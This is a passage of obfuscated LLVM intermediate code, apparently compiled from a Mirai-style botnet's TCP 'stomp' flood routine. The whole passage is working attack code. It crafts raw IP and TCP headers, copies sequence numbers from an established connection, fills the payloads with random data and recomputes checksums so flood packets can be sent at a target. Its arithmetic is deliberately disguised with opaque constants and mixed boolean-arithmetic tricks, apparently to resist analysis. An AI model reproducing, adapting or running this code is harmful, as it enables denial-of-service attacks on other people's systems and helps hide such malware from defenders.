  %222 = icmp ugt i64 %221, 40
  br i1 %222, label %223, label %711

; <label>:223:                                    ; preds = %219
  %224 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %225 = getelementptr inbounds i8, i8* %224, i64 20
  %226 = bitcast i8* %225 to %struct.tcphdr*
  store %struct.tcphdr* %226, %struct.tcphdr** %35, align 8
  %227 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %228 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %227, i32 0, i32 0
  %229 = load i16, i16* %228, align 4
  %230 = zext i16 %229 to i32
  %231 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %232 = load i16, i16* %231, align 2
  %233 = zext i16 %232 to i32
  %234 = icmp eq i32 %230, %233
  br i1 %234, label %235, label %710

; <label>:235:                                    ; preds = %223
  %236 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 4
  %238 = load i16, i16* %237, align 4
  %239 = lshr i16 %238, 9
  %240 = xor i16 1, -1
  %241 = xor i16 %239, %240
  %242 = and i16 %241, %239
  %243 = and i16 %239, 1
  %244 = zext i16 %242 to i32
  %245 = icmp ne i32 %244, 0
  br i1 %245, label %246, label %679

; <label>:246:                                    ; preds = %235
  %247 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %248 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %247, i32 0, i32 4
  %249 = load i16, i16* %248, align 4
  %250 = lshr i16 %249, 12
  %251 = xor i16 1, -1
  %252 = xor i16 %250, %251
  %253 = and i16 %252, %250
  %254 = and i16 %250, 1
  %255 = zext i16 %253 to i32
  %256 = icmp ne i32 %255, 0
  br i1 %256, label %257, label %679

; <label>:257:                                    ; preds = %246
  %258 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %259 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %258, i32 0, i32 0
  %260 = load i32, i32* %259, align 4
  %261 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %262 = load i32, i32* %9, align 4
  %263 = sext i32 %262 to i64
  %264 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %261, i64 %263
  %265 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %264, i32 0, i32 0
  store i32 %260, i32* %265, align 4
  %266 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %267 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %266, i32 0, i32 2
  %268 = load i32, i32* %267, align 4
  %269 = call i32 @ntohl(i32 %268) #7
  %270 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %271 = load i32, i32* %9, align 4
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %270, i64 %272
  %274 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %273, i32 0, i32 1
  store i32 %269, i32* %274, align 4
  %275 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %276 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %275, i32 0, i32 3
  %277 = load i32, i32* %276, align 4
  %278 = call i32 @ntohl(i32 %277) #7
  %279 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %280 = load i32, i32* %9, align 4
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %279, i64 %281
  %283 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %282, i32 0, i32 2
  store i32 %278, i32* %283, align 4
  %284 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %285 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %284, i32 0, i32 1
  %286 = load i16, i16* %285, align 2
  %287 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %288 = load i32, i32* %9, align 4
  %289 = sext i32 %288 to i64
  %290 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %287, i64 %289
  %291 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %290, i32 0, i32 3
  store i16 %286, i16* %291, align 4
  %292 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %293 = load i16, i16* %292, align 2
  %294 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %295 = load i32, i32* %9, align 4
  %296 = sext i32 %295 to i64
  %297 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %294, i64 %296
  %298 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %297, i32 0, i32 4
  store i16 %293, i16* %298, align 2
  %299 = load i32, i32* %24, align 4
  %300 = sext i32 %299 to i64
  %301 = add i64 40, 5461945606817156506
  %302 = add i64 %301, %300
  %303 = sub i64 %302, 5461945606817156506
  %304 = add i64 40, %300
  %305 = call noalias i8* @malloc(i64 %303) #6
  %306 = load i8**, i8*** %12, align 8
  %307 = load i32, i32* %9, align 4
  %308 = sext i32 %307 to i64
  %309 = getelementptr inbounds i8*, i8** %306, i64 %308
  store i8* %305, i8** %309, align 8
  %310 = load i8**, i8*** %12, align 8
  %311 = load i32, i32* %9, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds i8*, i8** %310, i64 %312
  %314 = load i8*, i8** %313, align 8
  %315 = bitcast i8* %314 to %struct.iphdr*
  store %struct.iphdr* %315, %struct.iphdr** %36, align 8
  %316 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %317 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %316, i64 1
  %318 = bitcast %struct.iphdr* %317 to %struct.tcphdr*
  store %struct.tcphdr* %318, %struct.tcphdr** %37, align 8
  %319 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %320 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %319, i64 1
  %321 = bitcast %struct.tcphdr* %320 to i8*
  store i8* %321, i8** %38, align 8
  %322 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %323 = bitcast %struct.iphdr* %322 to i8*
  %324 = load i8, i8* %323, align 4
  %325 = xor i8 %324, -1
  %326 = xor i8 15, -1
  %327 = xor i8 -45, -1
  %328 = or i8 %325, %326
  %329 = or i8 -45, %327
  %330 = xor i8 %328, -1
  %331 = and i8 %330, %329
  %332 = and i8 %324, 15
  %333 = xor i8 %331, -1
  %334 = xor i8 64, -1
  %335 = xor i8 74, -1
  %336 = and i8 %333, 74
  %337 = and i8 %331, %335
  %338 = and i8 %334, 74
  %339 = and i8 64, %335
  %340 = or i8 %336, %337
  %341 = or i8 %338, %339
  %342 = xor i8 %340, %341
  %343 = or i8 %333, %334
  %344 = xor i8 %343, -1
  %345 = or i8 74, %335
  %346 = and i8 %344, %345
  %347 = or i8 %342, %346
  %348 = or i8 %331, 64
  store i8 %347, i8* %323, align 4
  %349 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %350 = bitcast %struct.iphdr* %349 to i8*
  %351 = load i8, i8* %350, align 4
  %352 = xor i8 %351, -1
  %353 = xor i8 -16, -1
  %354 = xor i8 -23, -1
  %355 = or i8 %352, %353
  %356 = or i8 -23, %354
  %357 = xor i8 %355, -1
  %358 = and i8 %357, %356
  %359 = and i8 %351, -16
  %360 = xor i8 %358, -1
  %361 = xor i8 5, -1
  %362 = xor i8 -118, -1
  %363 = and i8 %360, -118
  %364 = and i8 %358, %362
  %365 = and i8 %361, -118
  %366 = and i8 5, %362
  %367 = or i8 %363, %364
  %368 = or i8 %365, %366
  %369 = xor i8 %367, %368
  %370 = or i8 %360, %361
  %371 = xor i8 %370, -1
  %372 = or i8 -118, %362
  %373 = and i8 %371, %372
  %374 = or i8 %369, %373
  %375 = or i8 %358, 5
  store i8 %374, i8* %350, align 4
  %376 = load i8, i8* %13, align 1
  %377 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %378 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %377, i32 0, i32 1
  store i8 %376, i8* %378, align 1
  %379 = load i32, i32* %24, align 4
  %380 = sext i32 %379 to i64
  %381 = sub i64 40, 9095687578771750131
  %382 = add i64 %381, %380
  %383 = add i64 %382, 9095687578771750131
  %384 = add i64 40, %380
  %385 = trunc i64 %383 to i16
  %386 = call zeroext i16 @htons(i16 zeroext %385) #7
  %387 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %388 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %387, i32 0, i32 2
  store i16 %386, i16* %388, align 2
  %389 = load i16, i16* %14, align 2
  %390 = call zeroext i16 @htons(i16 zeroext %389) #7
  %391 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %392 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %391, i32 0, i32 3
  store i16 %390, i16* %392, align 4
  %393 = load i8, i8* %15, align 1
  %394 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %395 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %394, i32 0, i32 5
  store i8 %393, i8* %395, align 4
  %396 = load i8, i8* %16, align 1
  %397 = icmp ne i8 %396, 0
  br i1 %397, label %398, label %402

; <label>:398:                                    ; preds = %257
  %399 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %400 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %401 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %400, i32 0, i32 4
  store i16 %399, i16* %401, align 2
  br label %402

; <label>:402:                                    ; preds = %398, %257
  %403 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %404 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %403, i32 0, i32 6
  store i8 6, i8* %404, align 1
  %405 = load i32, i32* @LOCAL_ADDR, align 4
  %406 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %407 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %406, i32 0, i32 8
  store i32 %405, i32* %407, align 4
  %408 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %409 = load i32, i32* %9, align 4
  %410 = sext i32 %409 to i64
  %411 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %408, i64 %410
  %412 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %411, i32 0, i32 0
  %413 = load i32, i32* %412, align 4
  %414 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %415 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %414, i32 0, i32 9
  store i32 %413, i32* %415, align 4
  %416 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %417 = load i32, i32* %9, align 4
  %418 = sext i32 %417 to i64
  %419 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %416, i64 %418
  %420 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %419, i32 0, i32 3
  %421 = load i16, i16* %420, align 4
  %422 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %423 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %422, i32 0, i32 0
  store i16 %421, i16* %423, align 4
  %424 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %425 = load i32, i32* %9, align 4
  %426 = sext i32 %425 to i64
  %427 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %424, i64 %426
  %428 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %427, i32 0, i32 4
  %429 = load i16, i16* %428, align 2
  %430 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %431 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %430, i32 0, i32 1
  store i16 %429, i16* %431, align 2
  %432 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %433 = load i32, i32* %9, align 4
  %434 = sext i32 %433 to i64
  %435 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %432, i64 %434
  %436 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %435, i32 0, i32 2
  %437 = load i32, i32* %436, align 4
  %438 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %439 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %438, i32 0, i32 2
  store i32 %437, i32* %439, align 4
  %440 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %441 = load i32, i32* %9, align 4
  %442 = sext i32 %441 to i64
  %443 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %440, i64 %442
  %444 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %443, i32 0, i32 1
  %445 = load i32, i32* %444, align 4
  %446 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %447 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %446, i32 0, i32 3
  store i32 %445, i32* %447, align 4
  %448 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %449 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %448, i32 0, i32 4
  %450 = load i16, i16* %449, align 4
  %451 = xor i16 -241, -1
  %452 = xor i16 %450, %451
  %453 = and i16 %452, %450
  %454 = and i16 %450, -241
  %455 = xor i16 %453, -1
  %456 = xor i16 128, -1
  %457 = xor i16 -24939, -1
  %458 = and i16 %455, -24939
  %459 = and i16 %453, %457
  %460 = and i16 %456, -24939
  %461 = and i16 128, %457
  %462 = or i16 %458, %459
  %463 = or i16 %460, %461
  %464 = xor i16 %462, %463
  %465 = or i16 %455, %456
  %466 = xor i16 %465, -1
  %467 = or i16 -24939, %457
  %468 = and i16 %466, %467
  %469 = or i16 %464, %468
  %470 = or i16 %453, 128
  store i16 %469, i16* %449, align 4
  %471 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %472 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %471, i32 0, i32 4
  %473 = load i16, i16* %472, align 4
  %474 = xor i16 %473, -1
  %475 = xor i16 -257, -1
  %476 = xor i16 -9963, -1
  %477 = or i16 %474, %475
  %478 = or i16 -9963, %476
  %479 = xor i16 %477, -1
  %480 = and i16 %479, %478
  %481 = and i16 %473, -257
  %482 = xor i16 %480, -1
  %483 = xor i16 256, -1
  %484 = xor i16 -25165, -1
  %485 = and i16 %482, -25165
  %486 = and i16 %480, %484
  %487 = and i16 %483, -25165
  %488 = and i16 256, %484
  %489 = or i16 %485, %486
  %490 = or i16 %487, %488
  %491 = xor i16 %489, %490
  %492 = or i16 %482, %483
  %493 = xor i16 %492, -1
  %494 = or i16 -25165, %484
  %495 = and i16 %493, %494
  %496 = or i16 %491, %495
  %497 = or i16 %480, 256
  store i16 %496, i16* %472, align 4
  %498 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %499 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %498, i32 0, i32 4
  %500 = load i16, i16* %499, align 4
  %501 = xor i16 -4097, -1
  %502 = xor i16 %500, %501
  %503 = and i16 %502, %500
  %504 = and i16 %500, -4097
  %505 = xor i16 %503, -1
  %506 = xor i16 4096, -1
  %507 = xor i16 -6277, -1
  %508 = and i16 %505, -6277
  %509 = and i16 %503, %507
  %510 = and i16 %506, -6277
  %511 = and i16 4096, %507
  %512 = or i16 %508, %509
  %513 = or i16 %510, %511
  %514 = xor i16 %512, %513
  %515 = or i16 %505, %506
  %516 = xor i16 %515, -1
  %517 = or i16 -6277, %507
  %518 = and i16 %516, %517
  %519 = or i16 %514, %518
  %520 = or i16 %503, 4096
  store i16 %519, i16* %499, align 4
  %521 = call i32 @rand_next()
  %522 = xor i32 %521, -1
  %523 = xor i32 65535, -1
  %524 = xor i32 -1042382773, -1
  %525 = or i32 %522, %523
  %526 = or i32 -1042382773, %524
  %527 = xor i32 %525, -1
  %528 = and i32 %527, %526
  %529 = and i32 %521, 65535
  %530 = trunc i32 %528 to i16
  %531 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %532 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %531, i32 0, i32 5
  store i16 %530, i16* %532, align 2
  %533 = load i8, i8* %18, align 1
  %534 = sext i8 %533 to i16
  %535 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %536 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %535, i32 0, i32 4
  %537 = load i16, i16* %536, align 4
  %538 = xor i16 1, -1
  %539 = xor i16 %534, %538
  %540 = and i16 %539, %534
  %541 = and i16 %534, 1
  %542 = shl i16 %540, 13
  %543 = xor i16 %537, -1
  %544 = xor i16 -8193, -1
  %545 = xor i16 -2268, -1
  %546 = or i16 %543, %544
  %547 = or i16 -2268, %545
  %548 = xor i16 %546, -1
  %549 = and i16 %548, %547
  %550 = and i16 %537, -8193
  %551 = and i16 %549, %542
  %552 = xor i16 %549, %542
  %553 = or i16 %551, %552
  %554 = or i16 %549, %542
  store i16 %553, i16* %536, align 4
  %555 = load i8, i8* %19, align 1
  %556 = sext i8 %555 to i16
  %557 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %558 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %557, i32 0, i32 4
  %559 = load i16, i16* %558, align 4
  %560 = xor i16 %556, -1
  %561 = xor i16 1, -1
  %562 = xor i16 1507, -1
  %563 = or i16 %560, %561
  %564 = or i16 1507, %562
  %565 = xor i16 %563, -1
  %566 = and i16 %565, %564
  %567 = and i16 %556, 1
  %568 = shl i16 %566, 12
  %569 = xor i16 -4097, -1
  %570 = xor i16 %559, %569
  %571 = and i16 %570, %559
  %572 = and i16 %559, -4097
  %573 = xor i16 %571, -1
  %574 = xor i16 %568, -1
  %575 = xor i16 -29449, -1
  %576 = and i16 %573, -29449
  %577 = and i16 %571, %575
  %578 = and i16 %574, -29449
  %579 = and i16 %568, %575
  %580 = or i16 %576, %577
  %581 = or i16 %578, %579
  %582 = xor i16 %580, %581
  %583 = or i16 %573, %574
  %584 = xor i16 %583, -1
  %585 = or i16 -29449, %575
  %586 = and i16 %584, %585
  %587 = or i16 %582, %586
  %588 = or i16 %571, %568
  store i16 %587, i16* %558, align 4
  %589 = load i8, i8* %20, align 1
  %590 = sext i8 %589 to i16
  %591 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %592 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %591, i32 0, i32 4
  %593 = load i16, i16* %592, align 4
  %594 = xor i16 %590, -1
  %595 = xor i16 1, -1
  %596 = xor i16 29361, -1
  %597 = or i16 %594, %595
  %598 = or i16 29361, %596
  %599 = xor i16 %597, -1
  %600 = and i16 %599, %598
  %601 = and i16 %590, 1
  %602 = shl i16 %600, 11
  %603 = xor i16 -2049, -1
  %604 = xor i16 %593, %603
  %605 = and i16 %604, %593
  %606 = and i16 %593, -2049
  %607 = and i16 %605, %602
  %608 = xor i16 %605, %602
  %609 = or i16 %607, %608
  %610 = or i16 %605, %602
  store i16 %609, i16* %592, align 4
  %611 = load i8, i8* %21, align 1
  %612 = sext i8 %611 to i16
  %613 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %614 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %613, i32 0, i32 4
  %615 = load i16, i16* %614, align 4
  %616 = xor i16 1, -1
  %617 = xor i16 %612, %616
  %618 = and i16 %617, %612
  %619 = and i16 %612, 1
  %620 = shl i16 %618, 10
  %621 = xor i16 %615, -1
  %622 = xor i16 -1025, -1
  %623 = xor i16 -18089, -1
  %624 = or i16 %621, %622
  %625 = or i16 -18089, %623
  %626 = xor i16 %624, -1
  %627 = and i16 %626, %625
  %628 = and i16 %615, -1025
  %629 = and i16 %627, %620
  %630 = xor i16 %627, %620
  %631 = or i16 %629, %630
  %632 = or i16 %627, %620
  store i16 %631, i16* %614, align 4
  %633 = load i8, i8* %22, align 1
  %634 = sext i8 %633 to i16
  %635 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %636 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %635, i32 0, i32 4
  %637 = load i16, i16* %636, align 4
  %638 = xor i16 %634, -1
  %639 = xor i16 1, -1
  %640 = xor i16 -2428, -1
  %641 = or i16 %638, %639
  %642 = or i16 -2428, %640
  %643 = xor i16 %641, -1
  %644 = and i16 %643, %642
  %645 = and i16 %634, 1
  %646 = shl i16 %644, 9
  %647 = xor i16 -513, -1
  %648 = xor i16 %637, %647
  %649 = and i16 %648, %637
  %650 = and i16 %637, -513
  %651 = and i16 %649, %646
  %652 = xor i16 %649, %646
  %653 = or i16 %651, %652
  %654 = or i16 %649, %646
  store i16 %653, i16* %636, align 4
  %655 = load i8, i8* %23, align 1
  %656 = sext i8 %655 to i16
  %657 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %658 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %657, i32 0, i32 4
  %659 = load i16, i16* %658, align 4
  %660 = xor i16 1, -1
  %661 = xor i16 %656, %660
  %662 = and i16 %661, %656
  %663 = and i16 %656, 1
  %664 = shl i16 %662, 8
  %665 = xor i16 %659, -1
  %666 = xor i16 -257, -1
  %667 = xor i16 19808, -1
  %668 = or i16 %665, %666
  %669 = or i16 19808, %667
  %670 = xor i16 %668, -1
  %671 = and i16 %670, %669
  %672 = and i16 %659, -257
  %673 = and i16 %671, %664
  %674 = xor i16 %671, %664
  %675 = or i16 %673, %674
  %676 = or i16 %671, %664
  store i16 %675, i16* %658, align 4
  %677 = load i8*, i8** %38, align 8
  %678 = load i32, i32* %24, align 4
  call void @rand_str(i8* %677, i32 %678)
  br label %722

; <label>:679:                                    ; preds = %246, %235
  %680 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %681 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %680, i32 0, i32 4
  %682 = load i16, i16* %681, align 4
  %683 = lshr i16 %682, 8
  %684 = xor i16 %683, -1
  %685 = xor i16 1, -1
  %686 = xor i16 -7934, -1
  %687 = or i16 %684, %685
  %688 = or i16 -7934, %686
  %689 = xor i16 %687, -1
  %690 = and i16 %689, %688
  %691 = and i16 %683, 1
  %692 = zext i16 %690 to i32
  %693 = icmp ne i32 %692, 0
  br i1 %693, label %705, label %694

; <label>:694:                                    ; preds = %679
  %695 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %696 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %695, i32 0, i32 4
  %697 = load i16, i16* %696, align 4
  %698 = lshr i16 %697, 10
  %699 = xor i16 1, -1
  %700 = xor i16 %698, %699
  %701 = and i16 %700, %698
  %702 = and i16 %698, 1
  %703 = zext i16 %701 to i32
  %704 = icmp ne i32 %703, 0
  br i1 %704, label %705, label %708

; <label>:705:                                    ; preds = %694, %679
  %706 = load i32, i32* %26, align 4
  %707 = call i32 @close(i32 %706)
  br label %121

; <label>:708:                                    ; preds = %694
  br label %709

; <label>:709:                                    ; preds = %708
  br label %710

; <label>:710:                                    ; preds = %709, %223
  br label %711

; <label>:711:                                    ; preds = %710, %219, %211
  %712 = call i64 @time(i64* null) #6
  %713 = load i64, i64* %31, align 8
  %714 = sub i64 0, %713
  %715 = add i64 %712, %714
  %716 = sub nsw i64 %712, %713
  %717 = icmp sgt i64 %715, 10
  br i1 %717, label %718, label %721

; <label>:718:                                    ; preds = %711
  %719 = load i32, i32* %26, align 4
  %720 = call i32 @close(i32 %719)
  br label %121

; <label>:721:                                    ; preds = %711
  br label %199

; <label>:722:                                    ; preds = %402
  br label %723

; <label>:723:                                    ; preds = %722, %124
  %724 = load i32, i32* %9, align 4
  %725 = add i32 %724, 1872671796
  %726 = add i32 %725, 1
  %727 = sub i32 %726, 1872671796
  %728 = add nsw i32 %724, 1
  store i32 %727, i32* %9, align 4
  br label %115

; <label>:729:                                    ; preds = %115
  br label %730

; <label>:730:                                    ; preds = %859, %729
  store i32 0, i32* %9, align 4
  br label %731

; <label>:731:                                    ; preds = %853, %730
  %732 = load i32, i32* %9, align 4
  %733 = load i8, i8* %5, align 1
  %734 = zext i8 %733 to i32
  %735 = icmp slt i32 %732, %734
  br i1 %735, label %736, label %859

; <label>:736:                                    ; preds = %731
  %737 = load i8**, i8*** %12, align 8
  %738 = load i32, i32* %9, align 4
  %739 = sext i32 %738 to i64
  %740 = getelementptr inbounds i8*, i8** %737, i64 %739
  %741 = load i8*, i8** %740, align 8
  store i8* %741, i8** %39, align 8
  %742 = load i8*, i8** %39, align 8
  %743 = bitcast i8* %742 to %struct.iphdr*
  store %struct.iphdr* %743, %struct.iphdr** %40, align 8
  %744 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %745 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %744, i64 1
  %746 = bitcast %struct.iphdr* %745 to %struct.tcphdr*
  store %struct.tcphdr* %746, %struct.tcphdr** %41, align 8
  %747 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %748 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %747, i64 1
  %749 = bitcast %struct.tcphdr* %748 to i8*
  store i8* %749, i8** %42, align 8
  %750 = load i16, i16* %14, align 2
  %751 = zext i16 %750 to i32
  %752 = icmp eq i32 %751, 65535
  br i1 %752, label %753, label %762

; <label>:753:                                    ; preds = %736
  %754 = call i32 @rand_next()
  %755 = xor i32 65535, -1
  %756 = xor i32 %754, %755
  %757 = and i32 %756, %754
  %758 = and i32 %754, 65535
  %759 = trunc i32 %757 to i16
  %760 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %761 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %760, i32 0, i32 3
  store i16 %759, i16* %761, align 4
  br label %762

; <label>:762:                                    ; preds = %753, %736
  %763 = load i8, i8* %25, align 1
  %764 = icmp ne i8 %763, 0
  br i1 %764, label %765, label %768

; <label>:765:                                    ; preds = %762
  %766 = load i8*, i8** %42, align 8
  %767 = load i32, i32* %24, align 4
  call void @rand_str(i8* %766, i32 %767)
  br label %768

; <label>:768:                                    ; preds = %765, %762
  %769 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %770 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %769, i32 0, i32 7
  store i16 0, i16* %770, align 2
  %771 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %772 = bitcast %struct.iphdr* %771 to i16*
  %773 = call zeroext i16 @checksum_generic(i16* %772, i32 20)
  %774 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %775 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %774, i32 0, i32 7
  store i16 %773, i16* %775, align 2
  %776 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %777 = load i32, i32* %9, align 4
  %778 = sext i32 %777 to i64
  %779 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %776, i64 %778
  %780 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %779, i32 0, i32 1
  %781 = load i32, i32* %780, align 4
  %782 = sub i32 0, 1
  %783 = sub i32 %781, %782
  %784 = add i32 %781, 1
  store i32 %783, i32* %780, align 4
  %785 = trunc i32 %781 to i16
  %786 = call zeroext i16 @htons(i16 zeroext %785) #7
  %787 = zext i16 %786 to i32
  %788 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %789 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %788, i32 0, i32 2
  store i32 %787, i32* %789, align 4
  %790 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %791 = load i32, i32* %9, align 4
  %792 = sext i32 %791 to i64
  %793 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %790, i64 %792
  %794 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %793, i32 0, i32 2
  %795 = load i32, i32* %794, align 4
  %796 = trunc i32 %795 to i16
  %797 = call zeroext i16 @htons(i16 zeroext %796) #7
  %798 = zext i16 %797 to i32
  %799 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %800 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %799, i32 0, i32 3
  store i32 %798, i32* %800, align 4
  %801 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %802 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %801, i32 0, i32 6
  store i16 0, i16* %802, align 4
  %803 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %804 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %805 = bitcast %struct.tcphdr* %804 to i8*
  %806 = load i32, i32* %24, align 4
  %807 = sext i32 %806 to i64
  %808 = sub i64 0, 20
  %809 = sub i64 0, %807
  %810 = add i64 %808, %809
  %811 = sub i64 0, %810
  %812 = add i64 20, %807
  %813 = trunc i64 %811 to i16
  %814 = call zeroext i16 @htons(i16 zeroext %813) #7
  %815 = load i32, i32* %24, align 4
  %816 = sext i32 %815 to i64
  %817 = add i64 20, -8290680712519162331
  %818 = add i64 %817, %816
  %819 = sub i64 %818, -8290680712519162331
  %820 = add i64 20, %816
  %821 = trunc i64 %819 to i32
  %822 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %803, i8* %805, i16 zeroext %814, i32 %821)
  %823 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %824 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %823, i32 0, i32 6
  store i16 %822, i16* %824, align 4
  %825 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %826 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %825, i32 0, i32 1
  %827 = load i16, i16* %826, align 2
  %828 = load %struct.attack_target*, %struct.attack_target** %6, align 8
